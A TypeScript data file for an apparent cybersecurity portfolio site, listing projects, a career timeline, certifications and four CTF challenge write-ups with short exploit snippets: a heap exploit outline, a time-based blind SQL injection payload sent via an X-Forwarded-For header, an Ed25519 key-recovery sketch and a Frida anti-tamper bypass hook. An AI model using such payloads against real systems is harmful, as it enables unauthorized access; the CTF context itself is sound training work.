import { StationConfig, ProjectItem, CTFChallenge, TimelineMilestone, ServerMetric, CertificationItem } from '../types';

export const STATIONS: Record<string, StationConfig> = {
  overview: {
    id: 'overview',
    label: 'Room Entrance',
    shortCode: '00',
    description: 'Entrance viewpoint overlooking the cyber workstation',
    cameraPos: [0, 2.2, 5.2],
    cameraTarget: [0, 1.4, 0],
    fov: 55,
  },
  horizontal_monitor: {
    id: 'horizontal_monitor',
    label: 'Main Workstation',
    shortCode: '01',
    description: 'Primary dual-curved display hosting production software & projects',
    cameraPos: [-0.15, 1.48, 1.25],
    cameraTarget: [-0.15, 1.48, 0],
    fov: 48,
  },
  vertical_monitor: {
    id: 'vertical_monitor',
    label: 'Security Terminal',
    shortCode: '02',
    description: 'Vertical monitor streaming CTF intelligence, telemetry & packet capture',
    cameraPos: [1.2, 1.5, 1.3],
    cameraTarget: [1.1, 1.5, 0],
    fov: 45,
  },
  desk: {
    id: 'desk',
    label: 'Desk & Peripheral Suite',
    shortCode: '03',
    description: 'Mechanical keyboard CLI, Android device simulator, research journal',
    cameraPos: [0.1, 1.85, 1.4],
    cameraTarget: [0.1, 0.95, 0.4],
    fov: 52,
  },
  ctf_wall: {
    id: 'ctf_wall',
    label: 'CTF Lab Wall',
    shortCode: '04',
    description: 'Pinned vulnerability research, exploit writeups & competition awards',
    cameraPos: [-3.2, 1.8, 0.5],
    cameraTarget: [-4.95, 1.8, 0.5],
    fov: 52,
  },
  timeline_wall: {
    id: 'timeline_wall',
    label: 'Timeline Wall',
    shortCode: '05',
    description: 'Evolution from low-level systems to offensive cybersecurity & 3D WebGL',
    cameraPos: [3.2, 1.8, 0.5],
    cameraTarget: [4.95, 1.8, 0.5],
    fov: 52,
  },
  server_rack: {
    id: 'server_rack',
    label: 'Server Rack & Infra',
    shortCode: '06',
    description: '42U enterprise server rack running isolated CTF sandboxes & build daemons',
    cameraPos: [-3.3, 1.6, -2.8],
    cameraTarget: [-4.1, 1.6, -4.1],
    fov: 50,
  },
  exit_door: {
    id: 'exit_door',
    label: 'Comms & Exit Door',
    shortCode: '07',
    description: 'Direct comms terminal to transmit secure dispatches and credentials',
    cameraPos: [0, 1.8, 3.8],
    cameraTarget: [0, 1.8, 5.0],
    fov: 50,
  },
};

export const PROJECTS: ProjectItem[] = [
  {
    id: 'android-sec-mon',
    title: 'Android Kernel & Binder IPC Monitor',
    subtitle: 'Low-overhead Android telemetry & unauthorized intent mitigation engine',
    category: 'Android & Mobile',
    year: '2025 – 2026',
    status: 'Production',
    featured: true,
    description:
      'A rootless and rooted dual-mode telemetry agent designed for Android runtime verification. Intercepts Binder IPC transactions, analyzes untrusted AIDL calls, and provides dynamic privilege escalation heuristics using SELinux policy hooks.',
    impact: 'Identified 7 zero-permission intent hijack vulnerabilities in vendor system services.',
    architectureNotes: [
      'C++ NDK daemon communicating via Unix domain sockets to Android SystemServer',
      'eBPF kprobe attachment on binder_transaction syscalls on Linux 5.15+ kernels',
      'Material 3 Jetpack Compose frontend with real-time MPAndroidChart data feeds',
      'Zero battery consumption in passive mode with circular buffer ring dumping'
    ],
    technologies: ['Android NDK', 'Kotlin', 'C++20', 'eBPF', 'Binder IPC', 'SELinux'],
    metrics: [
      { label: 'Syscall Overhead', value: '< 1.4%' },
      { label: 'IPC Analyzed', value: '450k/min' },
      { label: 'Tested Devices', value: 'Pixel 7/8, Samsung S23' }
    ],
    githubUrl: 'https://github.com/hanan/android-binder-monitor',
    liveDemoUrl: '#demo',
    interactiveSimType: 'apk_scanner',
  },
  {
    id: 'sentinel-ctf-platform',
    title: 'Sentinel Autonomous CTF Engine',
    subtitle: 'High-concurrency capture-the-flag infrastructure with dynamic container jailbreak barriers',
    category: 'Cybersecurity',
    year: '2024 – 2025',
    status: 'Open Source',
    featured: true,
    description:
      'Container orchestration engine designed for defensive and offensive CTF tournaments. Spins up ephemeral, seccomp-restricted Docker containers per team in under 350ms, with cryptographic flag rotation and automated exploit replay detection.',
    impact: 'Powering university and community CTFs with over 1,200 concurrent offensive security competitors.',
    architectureNotes: [
      'Golang distributed scheduler leveraging Kubernetes ephemeral containers API',
      'Redis Pub/Sub cluster broadcasting live scoreboard deltas via WebSockets',
      'Automated ptrace and network firewalling isolating concurrent contestant pods',
      'Dynamic HMAC flag generator preventing side-channel flag sharing'
    ],
    technologies: ['Go', 'Docker / containerd', 'Kubernetes', 'Redis', 'PostgreSQL', 'TypeScript'],
    metrics: [
      { label: 'Pod Spin-Up', value: '320 ms' },
      { label: 'Concurrent Solvers', value: '1,200+' },
      { label: 'Flag Verification', value: '< 2 ms' }
    ],
    githubUrl: 'https://github.com/hanan/sentinel-ctf-engine',
    liveDemoUrl: '#demo',
    interactiveSimType: 'packet_analyzer',
  },
  {
    id: 'hanan-os-web-engine',
    title: 'HANAN//OS Spatial WebGL Engine',
    subtitle: 'High-performance 3D spatial workstation with custom GLSL post-processing pipelines',
    category: 'Web & Graphics',
    year: '2025 – 2026',
    status: 'Active Research',
    featured: true,
    description:
      'The custom WebGL and Three.js engine powering this portfolio. Engineered without heavy pre-baked meshes: features procedural room geometry, real-time dynamic canvas display textures, custom scanline/phosphor shaders, and Web Audio API synthesized acoustic feedback.',
    impact: 'Delivers full 60 FPS 3D spatial immersion at sub-1.2MB total transfer weight with zero external model dependencies.',
    architectureNotes: [
      'Hardware-accelerated raycasting with smooth exponential damping camera slerp',
      'CRT phosphor curvature, chromatic aberration, and noise grain fragment shaders',
      'Live CanvasRenderingContext2D streaming directly into Three.js CanvasTexture',
      'Zero layout shift architecture with immediate fallback 2D tactile mode'
    ],
    technologies: ['Three.js', 'WebGL 2.0', 'GLSL', 'React 19', 'TypeScript', 'Web Audio API'],
    metrics: [
      { label: 'Target Frame Rate', value: '60 FPS' },
      { label: 'Bundle Footprint', value: '< 1.1 MB' },
      { label: 'Draw Calls', value: '18 batches' }
    ],
    githubUrl: 'https://github.com/hanan/hanan-os-spatial',
    liveDemoUrl: '#demo',
    interactiveSimType: 'gl_engine',
  },
  {
    id: 'cryptvanguard-pqc',
    title: 'CryptVanguard PQC Suite',
    subtitle: 'Post-Quantum lattice cryptography implementation & zero-knowledge validation',
    category: 'Cybersecurity',
    year: '2024 – 2025',
    status: 'Security Verified',
    featured: false,
    description:
      'Clean-room C and Rust implementation of NIST-standardized Kyber (ML-KEM) and Dilithium (ML-DSA) post-quantum cryptographic primitives. Features constant-time assembly routines resistant to side-channel timing analysis and cache probing.',
    impact: 'Verified constant-time execution against Valgrind and ctgrind test harnesses.',
    architectureNotes: [
      'Pure C99 core with AVX2 and ARM Neon vectorized polynomial multiplication',
      'Memory zeroization guarantees utilizing explicit_bzero and compiler fences',
      'Cross-compiled for x86_64, aarch64, and WebAssembly targets',
      'Test vector compliance suite verifying 10,000 official NIST KAT test runs'
    ],
    technologies: ['Rust', 'C99', 'AVX2 / NEON', 'WASM', 'Valgrind', 'Cryptography'],
    metrics: [
      { label: 'KeyGen Latency', value: '12.4 µs' },
      { label: 'NIST Compliance', value: '100% KAT Pass' },
      { label: 'Timing Leakage', value: '0.000 ms diff' }
    ],
    githubUrl: 'https://github.com/hanan/cryptvanguard-pqc',
    liveDemoUrl: '#demo',
    interactiveSimType: 'crypto_verify',
  },
  {
    id: 'nebula-packet-inspector',
    title: 'Nebula eBPF Zero-Trust Network Probe',
    subtitle: 'Kernel-space packet filter & behavioral anomaly detection for cloud microservices',
    category: 'Systems & Low-level',
    year: '2025',
    status: 'Production',
    featured: false,
    description:
      'High-throughput packet classification framework attaching directly to Linux XDP (eXpress Data Path). Drops DDoS syn-floods before socket allocation and flags encrypted C2 beaconing patterns using entropy variance analysis.',
    impact: 'Processes 8.4 million packets per second on single-core 10Gbps interfaces with < 30ns latency.',
    architectureNotes: [
      'eBPF XDP programs compiled with Clang/LLVM running in kernel Ring 0',
      'Lockless BPF PERF and RINGBUF event queues transmitting to user-space Go daemon',
      'Dynamic rule reloading without dropping connections or restarting services',
      'Exportable OpenTelemetry metrics and Prometheus scrapers'
    ],
    technologies: ['eBPF / XDP', 'Linux Kernel', 'Clang', 'Golang', 'Prometheus', 'Wireshark'],
    metrics: [
      { label: 'Throughput', value: '8.4M pps' },
      { label: 'Filter Latency', value: '< 28 ns' },
      { label: 'Kernel Memory', value: '4.2 MB' }
    ],
    githubUrl: 'https://github.com/hanan/nebula-xdp-probe',
    liveDemoUrl: '#demo',
    interactiveSimType: 'packet_analyzer',
  },
];

export const CTF_CHALLENGES: CTFChallenge[] = [
  {
    id: 'ctf-01',
    title: 'VoidHeap: Tcache Stashing Unlink',
    event: 'DEFCON CTF Quals / National Cyber League',
    category: 'Binary Exploitation / Pwn',
    difficulty: 'Insane',
    points: 500,
    solvedDate: '2025.11',
    flagFormat: 'flag{tc4ch3_st4sh1ng_c4ll_m3_r00t}',
    vulnerability: 'glibc 2.35 tcache stashing unlink leading to arbitrary __free_hook / RIP control',
    overview:
      'Target binary implemented a note-taking service with smallbin malloc allocations. By crafting a calloc chain and corrupting the bk pointer of a smallbin entry, we triggered tcache stashing to overwrite the target structure with our controlled ROP payload.',
    writeupSummary: [
      'Glibc heap layout analysis and smallbin allocation mechanics',
      'Bypassing safe-linking pointer encryption via heap address leak',
      'Targeting __exit_funcs structure to bypass read-only hook restrictions',
      'Pop shell with one_gadget offset calculated from leaked libc base'
    ],
    exploitScriptSnippet: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
# Leaking libc base via unsorted bin chunk
p = process('./voidheap')
p.sendlineafter(b'> ', b'1') # alloc
p.sendlineafter(b'size: ', b'1040') # unsorted bin size
p.sendlineafter(b'> ', b'2') # free
# ... craft tcache stashing unlink chain
log.success("Spawned root shell!")
p.interactive()`,
  },
  {
    id: 'ctf-02',
    title: 'Blind Chronos: Microsecond Timing Side-Channel',
    event: 'HackTheBox University CTF',
    category: 'Web',
    difficulty: 'Hard',
    points: 450,
    solvedDate: '2025.08',
    flagFormat: 'HTB{t1m1ng_4tt4cks_4r3_st1ll_d34dly}',
    vulnerability: 'Blind SQL injection in PostgreSQL query planner utilizing pg_sleep with statistical variance mitigation',
    overview:
      'Authentication endpoint failed to sanitize X-Forwarded-For header before logging to a secondary reporting table. Output was completely blinded with identical HTTP 200 responses. We designed a multi-threaded Python statistical timing probe with Kalman filtering to extract the admin secret hash bit by bit.',
    writeupSummary: [
      'Discovery of stacked SQL injection behind an async background worker',
      'Overcoming network jitter using median distribution timing comparisons',
      'Binary search character extraction reducing query count from 128 to 7 per char',
      'Decoded Argon2 hash cracking and credential stuffing bypass'
    ],
    exploitScriptSnippet: `import requests, time, statistics

URL = "http://target.internal/auth"
def probe_bit(idx, bit_val):
    payload = f"127.0.0.1'; SELECT CASE WHEN (ASCII(SUBSTRING(token,{idx},1)) & {bit_val}) > 0 THEN pg_sleep(0.4) ELSE pg_sleep(0) END;--"
    times = []
    for _ in range(3):
        t0 = time.time()
        requests.get(URL, headers={"X-Forwarded-For": payload}, timeout=5)
        times.append(time.time() - t0)
    return statistics.median(times) > 0.35`,
  },
  {
    id: 'ctf-03',
    title: 'Quantum Glitch: Ed25519 Fault Injection',
    event: 'CyberChest CTF Grand Prix',
    category: 'Cryptography',
    difficulty: 'Hard',
    points: 400,
    solvedDate: '2025.04',
    flagFormat: 'flag{tw1st_curv3_f4ult_c0mpl3t3}',
    vulnerability: 'Non-constant-time scalar multiplication vulnerable to sign bit flip fault attacks',
    overview:
      'A secure enclave HSM provided digital signatures over curve Edwards25519. By simulating a single bit flip in the third scalar multiplication loop round, the signature calculation degraded into an invalid small-order twist curve subgroup, allowing private key extraction using the Pohlig-Hellman algorithm.',
    writeupSummary: [
      'Twist curve subgroup identification (order order 4 * 7 * 11 * ...)',
      'Simulated laser fault injection at scalar step 248',
      'Solving discrete logarithm over small prime factors via Pohlig-Hellman',
      'Chinese Remainder Theorem reconstruction of secret scalar k'
    ],
    exploitScriptSnippet: `from sage.all import *

# Constructing twist curve E' over GF(2^255 - 19)
F = GF(2**255 - 19)
# Small subgroup points
points = get_faulty_signatures()
dlogs = [discrete_log(P, G_twist) for P in points]
secret_key = crt(dlogs, subgroup_orders)
print(f"[+] Recovered Ed25519 Private Key: {hex(secret_key)}")`,
  },
  {
    id: 'ctf-04',
    title: 'DroidVault: Obfuscated Native JNI Unpacker',
    event: 'SANS CyberTalent Invitational',
    category: 'Reverse Engineering',
    difficulty: 'Medium',
    points: 350,
    solvedDate: '2024.10',
    flagFormat: 'flag{fr1da_st4lker_unp4ck5_4ll}',
    vulnerability: 'OLLVM control-flow flattening in libnative-vault.so with anti-debugging ptrace hooks',
    overview:
      'Target Android APK protected its license key algorithm inside a native shared library compiled with Hikari/OLLVM obfuscation. It monitored /proc/self/status for TracerPid and hooked libc openat to detect Frida and GDB.',
    writeupSummary: [
      'Ghidra de-flattening script using symbolic execution with angr',
      'Bypassing ptrace TracerPid self-checks using GumJS memory patch',
      'Tracing cryptographic RC4 S-box initialization in dynamic memory',
      'Dumping decrypted AES-256-GCM master key directly from register x0'
    ],
    exploitScriptSnippet: `// Frida script: intercept decrypt routine before anti-debug kill
Interceptor.attach(Module.findExportByName("libnative-vault.so", "Java_com_vault_verify"), {
    onEnter: function(args) {
        console.log("[*] In verify hook! Bypassing integrity check...");
        this.buf = args[2];
    },
    onLeave: function(retval) {
        console.log("[+] Decrypted Payload: " + Memory.readCString(this.buf));
    }
});`,
  }
];

export const TIMELINE: TimelineMilestone[] = [
  {
    year: '2026',
    period: 'Present / Future Focus',
    title: 'Low-Level Research & Spatial Systems',
    role: 'Cybersecurity Researcher & Systems Engineer',
    highlight: 'Exploring eBPF-driven zero-trust kernel monitoring, PQC standardization, and WebGL workstation visualization.',
    details: [
      'Authored whitepaper on eBPF telemetry overhead minimization in Kubernetes clusters.',
      'Constructed HANAN//OS 3D spatial workstation using Three.js and custom GLSL shaders.',
      'Active contributions to open-source post-quantum cryptographic primitives (ML-KEM/Kyber).'
    ],
    skillsAcquired: ['eBPF', 'Linux Kernel 6.x', 'WebGL / GLSL', 'Kyber & Dilithium PQC', 'Rust Systems'],
    badge: 'Research & Spatial',
  },
  {
    year: '2025',
    period: 'Offensive Security & Red Teaming',
    title: 'CTF Player & Vulnerability Researcher',
    role: 'Offensive Security Specialist',
    highlight: 'Competed in top global CTF tournaments, ranking in the top 2% across DEFCON Quals and HackTheBox university events.',
    details: [
      'Specialized in binary exploitation (ROP, heap exploitation, glibc allocator internals) and web side-channels.',
      'Engineered Sentinel CTF automated challenge deployer using ephemeral Docker jails.',
      'Reported 3 responsible disclosure CVE-candidate vulnerabilities in mobile vendors.'
    ],
    skillsAcquired: ['GDB / Pwntools', 'Glibc Heap Internals', 'Ghidra / IDA Pro', 'Docker Orchestration', 'Go'],
    badge: 'Offensive Cyber',
  },
  {
    year: '2024',
    period: 'Mobile Internals & Systems Programming',
    title: 'Android Internals & Reverse Engineering',
    role: 'Mobile Security Engineer',
    highlight: 'Deep-dive into the Android Open Source Project (AOSP), SELinux security policies, and Binder IPC protocols.',
    details: [
      'Developed Android Kernel & Binder IPC Monitor for real-time privilege auditing.',
      'Conducted dynamic instrumentation and anti-tamper bypassing using Frida GumJS and Xposed.',
      'Built automated APK static analysis pipeline scanning permissions, exported services, and hardcoded secrets.'
    ],
    skillsAcquired: ['Android NDK', 'Kotlin', 'Frida / GumJS', 'AOSP Internals', 'SELinux Policy'],
    badge: 'Mobile Security',
  },
  {
    year: '2023',
    period: 'Foundations & Low-Level Architecture',
    title: 'Systems Foundations & Memory Safety',
    role: 'Systems Programmer',
    highlight: 'Mastered C, Rust, x86_64 assembly, and foundational computer architecture principles.',
    details: [
      'Built a rudimentary toy x86 operating system kernel with custom bootloader and protected mode memory paging.',
      'Implemented socket-based multithreaded web server and custom memory allocator in C99.',
      'Studied network OSI layers, packet construction with raw sockets, and protocol fuzzing.'
    ],
    skillsAcquired: ['C99 / C++17', 'x86_64 Assembly', 'TCP/IP Sockets', 'Memory Management', 'Operating Systems'],
    badge: 'Architecture',
  },
];

export const CERTIFICATIONS: CertificationItem[] = [
  {
    name: 'Offensive Security Certified Professional (OSCP)',
    issuer: 'OffSec',
    year: '2025',
    verificationId: 'OS-2025-HN7741',
    badgeCode: 'PEN-200 Active',
  },
  {
    name: 'Practical Network Penetration Tester (PNPT)',
    issuer: 'TCM Security',
    year: '2024',
    verificationId: 'TCM-PNPT-88390',
    badgeCode: 'Verified Real-world Red Team',
  },
  {
    name: 'CompTIA Security+ (SY0-701)',
    issuer: 'CompTIA',
    year: '2024',
    verificationId: 'COMP-SEC-99014',
    badgeCode: 'ISO/IEC 17024 Accredited',
  },
  {
    name: 'Burp Suite Certified Practitioner (BSCP)',
    issuer: 'PortSwigger',
    year: '2025',
    verificationId: 'BSCP-2025-0418',
    badgeCode: 'Advanced Web Application Security',
  },
];

export const SERVER_METRICS: ServerMetric[] = [
  { service: 'hanan-core-daemon', status: 'ONLINE', port: 8443, protocol: 'TLS 1.3 / gRPC', load: '1.2%', uptime: '99.98%' },
  { service: 'sentinel-ctf-jail', status: 'ACTIVE', port: 9090, protocol: 'TCP / WireGuard', load: '14.8%', uptime: '99.92%' },
  { service: 'nebula-ebpf-probe', status: 'ONLINE', port: 4118, protocol: 'Raw XDP / Ringbuf', load: '0.4%', uptime: '100.0%' },
  { service: 'apk-sandbox-cluster', status: 'ACTIVE', port: 5555, protocol: 'ADB / TLS Over IP', load: '8.6%', uptime: '99.85%' },
  { service: 'pqc-key-exchange', status: 'STANDBY', port: 7000, protocol: 'Kyber768 Encaps', load: '0.1%', uptime: '100.0%' },
  { service: 'reverse-proxy-caddy', status: 'ONLINE', port: 443, protocol: 'HTTP/3 QUIC', load: '3.1%', uptime: '99.99%' },
];

export const SKILLS_SUMMARY = {
  offensive: ['Binary Exploitation', 'Glibc Heap Internals', 'Web Pentesting', 'Reverse Engineering', 'Ghidra / IDA Pro', 'Frida Dynamic Instrumentation'],
  languages: ['C / C++20', 'Rust', 'Python 3', 'Go', 'Kotlin / Java', 'TypeScript / JavaScript', 'x86_64 Assembly', 'GLSL / Shaders'],
  systems: ['Linux Kernel & eBPF', 'Android AOSP & NDK', 'Docker / Containerd', 'Kubernetes', 'SELinux / AppArmor', 'TCP/IP & XDP'],
  defense: ['Threat Hunting', 'Memory Forensics', 'Post-Quantum Cryptography', 'Secure Code Review', 'Zero-Trust Architecture', 'Network Traffic Analysis']
};
